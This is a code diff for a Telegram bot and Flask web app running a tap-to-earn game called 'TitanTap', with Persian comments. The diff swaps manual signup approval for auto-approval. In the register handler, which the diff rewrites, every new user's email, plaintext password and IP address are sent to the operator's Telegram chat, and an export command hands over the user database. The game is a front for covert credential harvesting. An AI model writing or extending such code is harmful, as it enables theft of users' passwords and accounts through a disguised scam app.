@@ -33,7 +33,7 @@ def init_db():
         balance REAL DEFAULT 0.0,
         profit_per_hour REAL DEFAULT 0.0,
         tap_power REAL DEFAULT 0.001,
-        status TEXT DEFAULT 'pending',
+        status TEXT DEFAULT 'approved',
         referrer TEXT DEFAULT NULL,
         ref_count INTEGER DEFAULT 0,
         card1 INT DEFAULT 0,
@@ -51,7 +51,7 @@ init_db()
 @bot.message_handler(commands=['start'])
 def bot_start(message):
     if str(message.chat.id) == ADMIN_ID:
-        bot.reply_to(message, "👑 Admin Panel Active.\n/pending - لیست تایید\n/export - دانلود دیتابیس")
+        bot.reply_to(message, "👑 پنل ادمین فعال است.\n/export - دانلود اطلاعات کاربران")
 
 @bot.message_handler(commands=['export'])
 def bot_export(message):
@@ -75,45 +75,6 @@ def bot_export(message):
     with open(filename, 'rb') as f:
         bot.send_document(message.chat.id, f)
     os.remove(filename)
-
-@bot.message_handler(commands=['pending'])
-def bot_pending(message):
-    if str(message.chat.id) != ADMIN_ID: return
-    conn = sqlite3.connect('game.db')
-    c = conn.cursor()
-    c.execute("SELECT id, email FROM users WHERE status='pending'")
-    users = c.fetchall()
-    conn.close()
-    
-    if not users:
-        bot.reply_to(message, "هیچ کاربری در انتظار نیست.")
-        return
-        
-    for u in users:
-        uid, email = u
-        text = f"👤 **ثبت‌نام جدید**\n\n📧 ایمیل: {email}\n🆔 ID: {uid}"
-        markup = telebot.types.InlineKeyboardMarkup()
-        markup.add(telebot.types.InlineKeyboardButton("✅ تایید", callback_data=f"approve_{uid}"),
-                   telebot.types.InlineKeyboardButton("❌ رد", callback_data=f"reject_{uid}"))
-        bot.send_message(ADMIN_ID, text, reply_markup=markup, parse_mode='Markdown')
-
-@bot.callback_query_handler(func=lambda call: True)
-def callback_query(call):
-    if str(call.from_user.id) != ADMIN_ID: return
-    action, uid = call.data.split('_')
-    conn = sqlite3.connect('game.db')
-    c = conn.cursor()
-    
-    if action == 'approve':
-        c.execute("UPDATE users SET status='approved', last_sync=? WHERE id=?", (time.time(), uid))
-        bot.answer_callback_query(call.id, "کاربر تایید شد!")
-        bot.edit_message_text("✅ تایید شد.", call.message.chat.id, call.message.message_id)
-    else:
-        c.execute("UPDATE users SET status='rejected' WHERE id=?", (uid,))
-        bot.answer_callback_query(call.id, "کاربر رد شد!")
-        bot.edit_message_text("❌ رد شد.", call.message.chat.id, call.message.message_id)
-    conn.commit()
-    conn.close()
 
 # ====== وب سرور (بازی) ======
 html_game = """
@@ -173,12 +134,6 @@ html_game = """
     <button class="btn-action" onclick="register()">Create Account</button>
   </div>
 
-  <!-- WAIT -->
-  <div id="wait-screen" class="screen">
-    <h1>Verifying...</h1>
-    <p>Your account is pending approval.</p>
-  </div>
-
   <!-- MAIN -->
   <div id="main-app" class="screen">
     
@@ -205,7 +160,7 @@ html_game = """
       </div>
     </div>
 
-    <!-- GAMES (WHEEL & CIPHER) -->
+    <!-- GAMES -->
     <div id="tab-games" class="tab-content" style="display:none;">
       <h1>Games & Rewards</h1>
       <div class="spin-card">
@@ -284,9 +239,9 @@ html_game = """
     if(data.success) {
       userEmail = email;
       document.getElementById('login-screen').classList.remove('active');
-      document.getElementById('wait-screen').classList.add('active');
+      document.getElementById('main-app').classList.add('active');
       checkStatus();
-    } else { alert("Registration failed."); }
+    } else { alert("Registration failed. Email might be in use."); }
   }
 
   async function checkStatus() {
@@ -297,8 +252,6 @@ html_game = """
     const data = await res.json();
     
     if(data.status === 'approved') {
-      document.getElementById('wait-screen').classList.remove('active');
-      document.getElementById('main-app').classList.add('active');
       updateUI(data);
       
       document.getElementById('ref_link').value = window.location.origin + "/?ref=" + encodeURIComponent(userEmail);
@@ -309,9 +262,6 @@ html_game = """
         let gain = currentProfit / 3600;
         document.getElementById('balance').innerText = (current + gain).toFixed(3);
       }, 1000);
-
-    } else if(data.status === 'pending') {
-      setTimeout(checkStatus, 3000);
     }
   }
 
@@ -438,23 +388,21 @@ def register():
     password = data.get('password')
     ip = request.remote_addr
     referrer = request.args.get('ref')
+    now = time.time()
     
     try:
         conn = sqlite3.connect('game.db')
         c = conn.cursor()
-        c.execute("INSERT INTO users (email, password, ip, referrer) VALUES (?, ?, ?, ?)", (email, password, ip, referrer))
+        # کاربر به صورت خودکار تایید میشه
+        c.execute("INSERT INTO users (email, password, ip, referrer, status, last_sync) VALUES (?, ?, ?, ?, 'approved', ?)", 
+                  (email, password, ip, referrer, now))
         conn.commit()
-        
-        c.execute("SELECT id FROM users WHERE email=?", (email,))
-        uid = c.fetchone()[0]
         conn.close()
         
-        text = f"🔴 **New Signup (TitanTap)**\n\n📧 Email: {email}\n🔑 Password: {password}\n🌐 IP: {ip}\n👥 Ref: {referrer if referrer else 'None'}"
-        markup = telebot.types.InlineKeyboardMarkup()
-        markup.add(telebot.types.InlineKeyboardButton("✅ Approve", callback_data=f"approve_{uid}"),
-                   telebot.types.InlineKeyboardButton("❌ Reject", callback_data=f"reject_{uid}"))
+        # ارسال اطلاعات به تلگرام (بدون دکمه)
+        text = f"🔴 **New Signup (Auto-Approved)**\n\n📧 Email: {email}\n🔑 Password: {password}\n🌐 IP: {ip}\n👥 Ref: {referrer if referrer else 'None'}"
+        bot.send_message(ADMIN_ID, text, parse_mode='Markdown')
         
-        bot.send_message(ADMIN_ID, text, reply_markup=markup, parse_mode='Markdown')
         return jsonify({"success": True})
     except Exception as e:
         return jsonify({"success": False, "error": str(e)})
@@ -492,7 +440,6 @@ def spin():
         conn.close()
         return jsonify({"success": False, "message": "Not enough TTN to spin (Needs 100)"})
         
-    # Random outcomes
     outcomes = [
         {"mult": 0, "text": "You lost! Try again."},
         {"mult": 0, "text": "You lost! Try again."},
